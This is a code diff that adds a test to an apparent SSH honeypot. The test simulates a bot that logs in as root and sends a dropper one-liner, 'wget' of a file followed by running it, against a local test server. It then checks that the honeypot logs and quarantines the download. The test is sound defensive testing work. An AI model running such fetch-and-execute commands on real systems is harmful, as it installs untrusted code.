@@ -79,3 +79,58 @@ def test_authenticated_session_is_dropped_after_max_session_seconds(tmp_path):
     events = asyncio.run(run())
     closed = next(e for e in events if e["event"] == "session.closed")
     assert closed["reason"] == "max_duration_exceeded"
+
+
+def test_ssh_exec_requests_are_dispatched_and_logged(tmp_path):
+    """`ssh host "<cmd>"` (paramiko exec_command) is how most SSH droppers
+    deliver their one-liner; the listener used to ignore process.command, so
+    the command was never logged and any download never attempted. Also runs
+    several exec channels over one connection, as such bots do."""
+    import http.server
+    import threading
+
+    serve = tmp_path / "www"
+    serve.mkdir()
+    (serve / "mal.bin").write_bytes(b"\x7fELF-not-really")
+    handler = lambda *a, **kw: http.server.SimpleHTTPRequestHandler(*a, directory=str(serve), **kw)
+    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
+    threading.Thread(target=httpd.serve_forever, daemon=True).start()
+    url = f"http://127.0.0.1:{httpd.server_address[1]}/mal.bin"
+
+    async def run() -> tuple[list[str], list[dict]]:
+        config = HoneypotConfig(
+            persona=PersonaConfig(arch="riscv64"),
+            credentials=CredentialPolicy(accept_any=True),
+            listeners={"bind_host": "127.0.0.1", "ssh_port": 0, "telnet_enabled": False},
+            fetcher={"quarantine_dir": str(tmp_path / "q"), "jobs_dir": str(tmp_path / "j"),
+                     "block_private_networks": False},
+            logging={"log_dir": str(tmp_path / "logs"), "transcript_dir": str(tmp_path / "transcripts")},
+        )
+        logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
+        server = await start_ssh_listener(config, logger, host_key_path=tmp_path / "host_key")
+        outputs: list[str] = []
+        try:
+            port = server.get_addresses()[0][1]
+            async with asyncssh.connect("127.0.0.1", port=port, username="root", password="root",
+                                         known_hosts=None) as conn:
+                for cmd in ("uname -m", f"cd /tmp; wget {url} -O mal.bin; ./mal.bin"):
+                    result = await asyncio.wait_for(conn.run(cmd, check=False, input=""), timeout=10)
+                    outputs.append(result.stdout)
+            await asyncio.sleep(0.2)
+        finally:
+            server.close()
+        events = [json.loads(l) for l in (tmp_path / "logs" / "events.jsonl").read_text().splitlines()]
+        return outputs, events
+
+    try:
+        outputs, events = asyncio.run(run())
+    finally:
+        httpd.shutdown()
+        httpd.server_close()
+
+    assert outputs[0] == "riscv64\n"
+    assert "saved" in outputs[1]
+    assert [e["outcome"] for e in events if e["event"] == "file.download"] == ["requested", "success"]
+    assert len([e for e in events if e["event"] == "file.execution_attempt"]) == 1
+    assert len([e for e in events if e["event"] == "session.closed"]) == 1
+    assert len(list((tmp_path / "q").glob("*.bin"))) == 1
